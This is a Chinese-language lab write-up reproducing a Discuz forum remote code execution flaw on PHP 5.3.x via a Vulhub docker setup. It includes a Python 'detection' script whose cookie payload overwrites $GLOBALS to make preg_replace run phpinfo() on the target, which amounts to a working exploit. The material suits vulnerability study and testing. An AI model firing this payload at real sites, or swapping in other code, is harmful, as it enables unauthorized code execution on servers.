### 目录 ###
- - -
- 漏洞介绍
- 复现

### 漏洞介绍 ###
- - -
由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。

具体原理请参考：

https://www.secpulse.com/archives/2338.html

### 复现 ###
- - -
首先下载好Vulhub进入Dz的那个文件夹，然后执行
```
docker-compose up -d
```
搭建成功后见到如下：
![k0WsuF.png](https://s2.ax1x.com/2019/02/13/k0WsuF.png)

对DZ论坛进行安装：
![k0WgE9.md.png](https://s2.ax1x.com/2019/02/13/k0WgE9.md.png)


安装完成后随便找一个有帖子的url
发送如下请求：
![k0Wf9x.png](https://s2.ax1x.com/2019/02/13/k0Wf9x.png)

![k0W4gK.png](https://s2.ax1x.com/2019/02/13/k0W4gK.png)


py检测脚本：
```python
#author:九世
#time:2019/2/13

import requests

def yuanc(urls):
    try:
        headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'}
        cookies = {}
        cookie = 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui,GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
        for r in cookie.split(','):
            key, value = r.split('=', 1)
            cookies[key] = value
        rqt=requests.get(url=urls,headers=headers,cookies=cookies)
        if 'PHP Version' in rqt.text:
            print('[x] 发现DZ远程代码执行漏洞')
            print('[X] 关键字：PHP Version')
            return 1
        return 0
    except Exception as r:
        print('[-] 错误：{}'.format(r))
```
![](https://s2.ax1x.com/2019/02/13/k0WouD.png)